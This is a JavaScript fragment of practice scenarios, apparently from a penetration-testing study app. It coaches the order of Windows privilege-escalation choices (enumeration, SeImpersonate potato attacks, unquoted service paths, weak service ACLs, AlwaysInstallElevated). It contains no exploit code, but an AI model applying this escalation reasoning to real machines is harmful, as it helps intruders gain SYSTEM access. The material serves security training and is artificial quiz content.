    'windows-enum': { situation: 'You have a shell as a low-privilege service account on Windows. First move?', choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'seimpersonate': 'You cannot know you hold SeImpersonate until you check, enumerate privileges first, then fire the potato.', 'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.', 'alwaysinstallelevated': 'Same, it only works if both registry keys are set. Enumerate to confirm before acting.' } },
    'seimpersonate': { situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.', choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'], coach: { 'unquoted-service-path': 'A valid alternative if one exists, but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.', 'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.', 'windows-enum': 'Already done, that is what told you SeImpersonate is enabled.' } },
    'unquoted-service-path': { situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.', choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'], coach: { 'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly, here the win is the writable directory in the unquoted path.', 'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.' } },
    'weak-service-permissions': { situation: 'accesschk shows your group has write access to a service configuration.', choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly, simpler.', 'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.' } },
    'alwaysinstallelevated': { situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.', choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'], coach: { 'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.', 'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.' } },
  };
  Object.keys(PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var p = PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = p.situation; OBOL.STUDY_FIXTURES[k].choices = p.choices; OBOL.STUDY_FIXTURES[k].coach = p.coach; } });

})(typeof globalThis !== 'undefined' ? globalThis : this);
